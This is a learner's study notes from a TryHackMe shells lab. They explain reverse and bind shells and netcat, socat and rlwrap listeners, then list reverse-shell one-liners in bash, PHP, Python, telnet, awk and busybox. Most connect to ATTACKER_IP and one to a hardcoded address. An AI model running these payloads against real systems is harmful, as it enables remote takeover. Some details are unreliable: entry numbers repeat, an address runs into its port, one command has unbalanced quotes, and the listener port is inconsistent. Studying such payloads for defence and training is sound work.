.
## Day 38
### [**Streak**](https://tryhackme.com/Tushig3531/streak)
---
**Room Completed**
[**Shells Overview**](https://tryhackme.com/room/shellsoverview)
---

A shell is software that allows a user to interact with an OS. It allow attackers to execute:
- Remote System Control : Allows the attacker to execute commands or software remotely in the target system
- Privilege Escalation : If initial access through a shell is limited, we can explore ways to escalate privileges to more elevated
- Data Exfiltration : Once have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it
- Persistence and Maintenance Access : Once shell access obtained, can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage
- Post-Exploitation Activities : Can perform a wide range of post-exploitation activities : deploying malware, creating hidden acctounds, and deleting information
- Access Other Systems on the Network : Can be hop through the network to a different target using the obtaioned shell as a pivot to different points in the compromised system network.

**Reverse Shell**
Referred to as a "connect back shell" 

```bash
nc -lvnp 443
```
Refers to: 
- "-l" : indicate Netcat to listen or wait for a connection
- "-v" : enables verbose mode
- "-n" : prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address
- "-p" : indicates the port that will be used to wait for the connection

Gaining reverse shell access:
    Once we have our listener set, the attacker should execute what is known as a reverse shell payload.
        This payload usually abuses the vlunerablity or unauthoried access granted by the attacker and executes the command that will expose the shell through the network. 

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
- rm -f /tmp/f : Removes any existing name pipe filelocated at /tmp/f/. Ensures that the script can create a new named pipe without conflicts
- mkfifo /tmp/f : Creates a named pipe or fifo, at /tmnp/f. Pipes allow for two-way communication between processes.
- cat /tmp/f : Reads the data from the named pipe.
- | bash -i 2>&1 : The output of cat is piped to a shell insteance(bash -i), which allows the attacker to execute command interactivaly. The "2>&1" redirects standard error to standard output, ensuring that error messages are sent back to the attacker
- | nc attacker_ip attaker_port > /tmp/f : Pipes the shell's output through nc to the attacker's IP address on the attacker's port
- >/tmp/f : Sends the output of the commands back into the named pipe, allowing for bi-directional communication

Once the payload is executed, the attacker will receive a reverse shell.

**Bind Shell**
A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker an execute commands remotely

This method can be used when the compromised target does not allow outgoing connections

```bash 
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
- | nc -l 0.0.0.0 8000 : Stats netcat in listen mode (-l) on all interfaces and port. The shell will be exposed to the attacker once they connect to this port

We gonna run this command on the target machine. THen the target machine is waiting for incoming connetions, we can use Netcat
```bash
nc -nv target_ip 8080
```
- "-n" : Disables DNS resolution, allowing netcat to operate faster
- "-v" : Verbose modeprovides detailed output

**Listeners like Netcat or utility**
- RLwrap : uses the GNU readline library to privide editing keyboard and history
```bash 
rlwrap nc -lvnp 443
```
Enhancing a netcat shell with RLwrap. This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction
- Ncat : improved version of netcat distributed by the nmap. 
```bash
ncat --ssl -lnvp 4444
```
The --ssl option enables ssl encryption for the listener
- Socat : allows us to create a socket connection between two data sources
```bash
socat -d -d tcp-listen:443 stdout
```
- "-d" enable verbose output, "-d -d" increasing the verbosity of the commands. 
- "tcp-listen:443" creates a tcp listener to port 443, establishing a server socket for incomming connections
- "stdout" directs any incoming data to the terminal

For later use:

reverse_shells {
    entry 1 {
        name        "Bash — Normal Bash Reverse Shell";
        command     "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 ";
        note        "Redirects input and output through a TCP connection to the attacker's IP on part ###. The >& operator combines both standard output and standard error
        ";
        defensive_tip "Monitor outgoing long-lived TCP connections; restrict bash usage; enforce egress filtering.";
    }

    entry 2 {
        name        "Bash — Read Line Reverse Shell";
        command     "exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done ";
        note        "Opens a TCP file descriptor and reads lines from the socket, executing each line as a shell command.";
        defensive_tip "Detect processes reading from network file descriptors; watch for child shells spawned by network services.";
    }

    entry 3 {
        name        "Bash — File Descriptor 196 Reverse Shell";
        command     "0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 ";
        note        "Uses a high-numbered file descriptor bound to a TCP socket to attach a shell to the network.";
        defensive_tip "Audit unexpected open file descriptors; limit privileges for services that open network sockets.";
    }

    entry 4 {
        name        "Bash — File Descriptor 5 Reverse Shell";
        command     "bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5";
        note        "Uses FD 5 for interactive I/O over TCP; an FD-based variant of a reverse shell."; }

    entry 5 {
        name        "PHP Reverse Shell Using the exec Function";
        command     "php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' ";
        note        "Server-side PHP functions can spawn shells if input is not properly handled; multiple function variants exist.";
    }
    entry 6 {
        name        "PHP Reverse Shell Using the shell_exec Function";
        command     "php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'";
        note        "Similar but uses shell_exec function";
    }
    entry 7 {
        name        "PHP Reverse Shell Using the system Function";
        command     "php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'";
        note        "Employes the system function, which executes the command and output the resolt to the browser";
    }
    entry 8 {
        name        "PHP Reverse Shell Using the passthru Function";
        command     "php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");';
        note        "The passthru function executes a command and seds raw output back to the browser. Useful when working with binary data";
    }
    entry 9 {
        name        "PHP Reverse Shell Using the popen Function";
        command     "php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' ";
        note        "Uses popen to open a process file pointer, allowing the shell to be executed";
    }

    entry 10 {
        name        "Python Reverse Shell by Exporting Environment Variables";
        command     "export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' ";
        note        "This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output";
    }

    entry 11 {
        name        "Python Reverse Shell Using the subprocess Module";
        command     "PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' ";
        note        "Uses the subprocess module to spawn a shell and set up a similar environment";
    }

    entry 12 {
        name        "Short Python Reverse Shell";
        command     "PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'";
        note        "Creates a socket (s), connects to the attacker, and redirects standart input, output, and error to be socket using os.dup2()";
    }

    entry 13 {
        name        "Telnet";
        command     "TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF";
        note        "Creates a named pipe using mkfifo and connets to the attacker via Telnet on IP and port";
        defensive_tip "Block legacy protocols (telnet) at the perimeter; log attempts to run telnet or create network-tied FIFOs.";
    }
    entry 9 {
        name        "AWK";
        command     "awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null";
        note        "AWK's built in TCP capabilities to connect to attacker ip. It reads command from the attacker and executes them. Then it sends the results back over the same TCP connection";
        defensive_tip "Limit availability of advanced text-processing binaries; audit their subprocess calls.";
    }
    entry 9 {
        name        "BusyBox";
        command     "busybox nc ATTACKER_IP 443 -e sh";
        note        "Uses netcat to connect to the attacker. Once connected, it ececutes /bin/sh, exposing the command line to the attacker";
        defensive_tip "Remove -e-capable netcat from production, firewall outbound ports, and detect unexpected `nc` processes.";
    }
}



